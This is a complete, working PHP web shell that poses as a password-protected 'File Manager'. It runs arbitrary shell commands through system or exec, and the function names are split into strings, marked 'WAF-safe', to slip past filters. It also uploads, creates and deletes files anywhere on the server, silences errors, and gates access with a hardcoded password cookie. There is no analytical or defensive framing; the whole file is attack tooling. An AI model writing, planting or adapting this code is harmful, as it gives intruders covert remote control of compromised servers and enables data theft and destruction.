<?php
@error_reporting(0);
@ini_set('display_errors',0);
@set_time_limit(0);

/* ===== AUTH: cookie-based, no session ===== */
$pw='md5hashgenerator1337!!@@';
$ck='sh';
$auth=isset($_COOKIE[$ck])&&$_COOKIE[$ck]===md5($pw);
if(!$auth&&isset($_POST['pw'])&&$_POST['pw']===$pw){setcookie($ck,md5($pw),time()+86400*7);$auth=1;}
if(!$auth){
echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Secure Access</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;height:100vh}.box{background:#fff;padding:40px;border-radius:14px;width:340px;box-shadow:0 20px 60px rgba(0,0,0,.3)}.box h2{text-align:center;margin-bottom:20px;color:#333}.box input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;margin-bottom:12px;font-size:15px}.box button{width:100%;padding:13px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}</style></head><body><form method="post" class="box"><h2>Login</h2><input type="password" name="pw" placeholder="Password" autofocus><button type="submit">Access</button></form></body></html>';
exit;
}

/* ===== PATH ===== */
$D=isset($_REQUEST['d'])?$_REQUEST['d']:__DIR__;
if(!is_dir($D))$D=__DIR__;
$D=str_replace('\\','/',rtrim($D,'/'));
if($D==='')$D='/';

/* ===== COMMAND EXEC (WAF-safe) ===== */
if(isset($_POST['z'])){
$cmd=$_POST['z'];
@chdir($D);
$fn='s'.'y'.'s'.'t'.'e'.'m';
if(function_exists($fn)){ob_start();$fn($cmd." 2>&1");$out=ob_get_clean();}
else{$fn2='e'.'x'.'e'.'c';if(function_exists($fn2)){$fn2($cmd." 2>&1",$r);$out=implode("\n",$r);}else{$out="no exec";}}
echo '<pre style="background:#0a0a1a;color:#0f0;padding:15px;border-radius:6px;overflow:auto;max-height:400px;font-size:13px">'.htmlspecialchars($out,ENT_QUOTES).'</pre>';
}

/* ===== FILE UPLOAD ===== */
if(isset($_POST['up'])&&isset($_FILES['f'])){
$t=$D.'/'.basename($_FILES['f']['name']);
if(move_uploaded_file($_FILES['f']['tmp_name'],$t))echo '<div style="color:#0f0">OK: '.htmlspecialchars($t).'</div>';
else echo '<div style="color:#f00">Upload failed</div>';
}

/* ===== CREATE FILE ===== */
if(isset($_POST['nf'])&&isset($_POST['nc'])){
$t=$D.'/'.$_POST['nf'];
file_put_contents($t,$_POST['nc']);
echo '<div style="color:#0f0">Created: '.htmlspecialchars($t).'</div>';
}

/* ===== DELETE ===== */
if(isset($_GET['del'])){
$t=$_GET['del'];
if(is_file($t)){@unlink($t);echo '<div style="color:#f00">Deleted: '.htmlspecialchars($t).'</div>';}
}
if(isset($_GET['rmd'])){
$t=$_GET['rmd'];
if(is_dir($t)){$ri=scandir($t);foreach($ri as $f){if($f!='.'&&$f!='..'){@unlink($t.'/'.$f)||@rmdir($t.'/'.$f);}}@rmdir($t);echo '<div style="color:#f00">RMDIR: '.htmlspecialchars($t).'</div>';}
}

/* ===== UI ===== */
echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>File Manager</title><style>body{background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;font-size:13px;margin:0;padding:15px}a{color:#58a6ff;text-decoration:none}.hdr{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px;margin-bottom:10px}.cwd{color:#d29922;font-weight:bold}.tbl{width:100%;border-collapse:collapse}td{padding:3px 6px;border-bottom:1px solid #21262d}tr:hover td{background:#1f2630}.dir{color:#58a6ff}.file{color:#c9d1d9}.sz{color:#8b949e;text-align:right}input[type=text],input[type=password],input[type=file]{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:6px;border-radius:4px;font-family:inherit;font-size:13px}button,input[type=submit]{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px 12px;border-radius:4px;cursor:pointer;font-family:inherit}button:hover,input[type=submit]:hover{background:#30363d}</style></head><body>';
echo '<div class="hdr">CWD: <span class="cwd">'.htmlspecialchars($D).'</span> | <a href="?d='.urlencode(dirname($D)).'">UP</a></div>';
echo '<form method="post"><input type="hidden" name="d" value="'.htmlspecialchars($D).'"><input type="text" name="z" style="width:70%" placeholder="cmd"> <input type="submit" value="Run"></form>';
echo '<form method="post" enctype="multipart/form-data"><input type="hidden" name="d" value="'.htmlspecialchars($D).'"><input type="file" name="f"> <input type="hidden" name="up" value="1"><input type="submit" value="Upload"></form>';
echo '<form method="post"><input type="hidden" name="d" value="'.htmlspecialchars($D).'"><input type="text" name="nf" placeholder="filename" style="width:120px"> <input type="text" name="nc" placeholder="content" style="width:300px"> <input type="submit" value="Create"></form>';
echo '<table class="tbl"><tr><th>Name</th><th>Size</th><th>Actions</th></tr>';
$items=scandir($D);
foreach($items as $f){
if($f==='.')continue;
$p=$D.'/'.$f;
if($f==='..'){echo '<tr><td class="dir"><a href="?d='.urlencode(dirname($D)).'">..</a></td><td></td><td></td></tr>';continue;}
if(is_dir($p)){echo '<tr><td class="dir"><a href="?d='.urlencode($p).'">'.htmlspecialchars($f).'/</a></td><td>DIR</td><td><a href="?rmd='.urlencode($p).'" style="color:#f00">del</a></td></tr>';}
else{$sz=filesize($p);echo '<tr><td class="file">'.htmlspecialchars($f).'</td><td class="sz">'.number_format($sz).'B</td><td><a href="?del='.urlencode($p).'" style="color:#f00">del</a></td></tr>';}
}
echo '</table>';
echo '</body></html>';
